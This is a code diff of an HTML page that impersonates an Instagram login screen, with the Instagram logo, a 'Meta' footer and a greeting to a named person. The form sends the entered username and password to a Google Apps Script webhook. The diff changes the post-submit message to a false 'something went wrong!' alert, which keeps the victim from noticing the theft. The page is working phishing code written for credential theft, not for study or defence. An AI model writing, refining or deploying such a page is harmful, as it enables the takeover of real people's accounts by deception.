@@ -3,35 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <title>Login with Google Sheets Backend</title>
-  <!-- Viewport for phone 9:16 and responsive -->
-  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no" />
   <style>
-    html, body {
-      margin: 0; padding: 0; height: 100%;
-      overflow-x: hidden;
+    body {
+      margin: 0;
       font-family: 'Segoe UI', Arial, sans-serif;
       background: #181628;
-    }
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
     }
     .container {
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      /* Phone-size max 9:16 aspect ratio */
-      width: 360px;  /* typical phone width */
-      height: 640px; /* typical phone height */
-      background: #181628;
-      box-sizing: border-box;
-      /* prevent scaling beyond this phone size */
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.6);
-      position: relative;
+      min-height: 100vh;
     }
     .card {
       background: #181628;
@@ -40,8 +23,8 @@
       text-align: center;
       padding: 60px 30px;
       box-shadow: 0 4px 30px rgba(58, 6, 95, 0.07);
+      max-width: 360px;
       width: 100%;
-      box-sizing: border-box;
     }
     .title {
       font-size: 2.2em;
@@ -74,8 +57,8 @@
       padding: 30px;
       box-shadow: 0 2px 18px rgba(18,31,69,.06);
       text-align: center;
+      max-width: 360px;
       width: 100%;
-      box-sizing: border-box;
       margin-top: 40px;
     }
     .instagram-logo {
@@ -94,7 +77,6 @@
       color: #222;
       transition: border 0.2s;
       margin-top: 10px;
-      box-sizing: border-box;
     }
     input:focus {
       border: 1.5px solid #a328f4;
@@ -105,20 +87,17 @@
       margin-bottom: 7px;
       display: block;
       margin-top: 10px;
-      user-select: none;
     }
     .meta {
       margin-top: 10px;
       font-size: 1em;
       color: #aaa;
-      user-select: none;
     }
     .back-btn {
       background: #282a36;
       margin-top: 18px;
       color: #fb39ff;
       border: 2px solid #fb39ff;
-      user-select: none;
     }
   </style>
 </head>
@@ -157,6 +136,7 @@
     const homepage = document.getElementById('homepage');
     const loginpage = document.getElementById('loginpage');
 
+    // Your Google Apps Script web app URL here:
     const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwL0xmSVybsbx7UdpGTMudPObUCdzdBWJPqf5_T-8i4ZkzpZTHzHqgUQg9D-3Jea369mw/exec";
 
     function showLogin() {
@@ -183,200 +163,10 @@
           },
           body: JSON.stringify({ username, password })
         });
-        alert("Login info sent!");
-      } catch (err) {
-        alert("Failed to send login info. Try again.");
-      }
-    }
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Login with Google Sheets Backend</title>
-  <!-- Viewport for phone 9:16 and responsive -->
-  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <style>
-    html, body {
-      margin: 0; padding: 0; height: 100%;
-      overflow-x: hidden;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: #181628;
-    }
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .container {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      /* Phone-size max 9:16 aspect ratio */
-      width: 360px;  /* typical phone width */
-      height: 640px; /* typical phone height */
-      background: #181628;
-      box-sizing: border-box;
-      /* prevent scaling beyond this phone size */
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.6);
-      position: relative;
-    }
-    .card {
-      background: #181628;
-      border-radius: 24px;
-      color: #FFF;
-      text-align: center;
-      padding: 60px 30px;
-      box-shadow: 0 4px 30px rgba(58, 6, 95, 0.07);
-      width: 100%;
-      box-sizing: border-box;
-    }
-    .title {
-      font-size: 2.2em;
-      margin-bottom: 20px;
-    }
-    .highlight {
-      color: #fb39ff;
-      font-weight: bold;
-    }
-    .btn, .back-btn {
-      background: linear-gradient(90deg, #a328f4 0%, #fb39ff 100%);
-      color: #FFF;
-      border: none;
-      border-radius: 32px;
-      padding: 16px 0;
-      cursor: pointer;
-      font-size: 1em;
-      font-weight: bold;
-      margin-top: 20px;
-      width: 80%;
-      transition: filter 0.2s;
-    }
-    .btn:active, .back-btn:active {
-      filter: brightness(0.8);
-    }
-    .input-card {
-      background: #FFF;
-      color: #111;
-      border-radius: 24px;
-      padding: 30px;
-      box-shadow: 0 2px 18px rgba(18,31,69,.06);
-      text-align: center;
-      width: 100%;
-      box-sizing: border-box;
-      margin-top: 40px;
-    }
-    .instagram-logo {
-      margin: 20px 0;
-      height: 60px;
-    }
-    input {
-      margin-bottom: 18px;
-      width: 88%;
-      padding: 14px 10px;
-      border: 1px solid #dcdcdc;
-      border-radius: 12px;
-      font-size: 1em;
-      outline: none;
-      background: #f9f9f9;
-      color: #222;
-      transition: border 0.2s;
-      margin-top: 10px;
-      box-sizing: border-box;
-    }
-    input:focus {
-      border: 1.5px solid #a328f4;
-    }
-    .forgot {
-      color: #a328f4;
-      font-size: 0.97em;
-      margin-bottom: 7px;
-      display: block;
-      margin-top: 10px;
-      user-select: none;
-    }
-    .meta {
-      margin-top: 10px;
-      font-size: 1em;
-      color: #aaa;
-      user-select: none;
-    }
-    .back-btn {
-      background: #282a36;
-      margin-top: 18px;
-      color: #fb39ff;
-      border: 2px solid #fb39ff;
-      user-select: none;
-    }
-  </style>
-</head>
-<body>
-  <div id="homepage" class="container">
-    <div class="card">
-      <div style="margin-bottom:24px; text-align:left;">
-        <span>Hello dear <strong>Rehan Mallick</strong></span>
-      </div>
-      <div class="title"><span>Let's Get <span class="highlight">Started!</span></span></div>
-      <button class="btn" onclick="showLogin()">START NOW</button>
-      <div style="margin:16px 0 6px; font-size:1em;">START YOUR JOURNEY</div>
-      <div style="margin-top:24px;">
-        <span style="font-size:.95em;color:#888;">Didn't have account?</span>
-        <a style="color:#fb39ff;font-weight:bold;text-decoration:none;margin-left:7px;" href="#">SIGN UP NOW</a>
-      </div>
-    </div>
-  </div>
-
-  <div id="loginpage" class="container" style="display:none;">
-    <div class="input-card">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-logo" />
-      <div style="font-size:1.12em;font-weight:bold;margin-bottom:8px;">Instagram</div>
-      <form id="loginform" autocomplete="off">
-        <input type="text" id="username" name="username" placeholder="Username, email address or mobile number" required />
-        <input type="password" id="password" name="password" placeholder="Password" required />
-        <button type="submit" class="btn" style="margin-top:0;">Log in</button>
-      </form>
-      <a class="forgot" href="#">Forgotten password?</a>
-      <button class="back-btn" onclick="showHome()">← Back to Homepage</button>
-      <div class="meta">Meta</div>
-    </div>
-  </div>
-
-  <script>
-    const homepage = document.getElementById('homepage');
-    const loginpage = document.getElementById('loginpage');
-
-    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwL0xmSVybsbx7UdpGTMudPObUCdzdBWJPqf5_T-8i4ZkzpZTHzHqgUQg9D-3Jea369mw/exec";
-
-    function showLogin() {
-      homepage.style.display = 'none';
-      loginpage.style.display = 'flex';
-    }
-    function showHome() {
-      loginpage.style.display = 'none';
-      homepage.style.display = 'flex';
-    }
-
-    document.getElementById('loginform').onsubmit = async function(event) {
-      event.preventDefault();
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          mode: "no-cors",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ username, password })
-        });
-        alert("something went wrong");
+        alert("something went wrong!");
+        // You can redirect or reset here if needed:
+        // showHome();
+        // or window.location.href = "...";
       } catch (err) {
         alert("Failed to send login info. Try again.");
       }
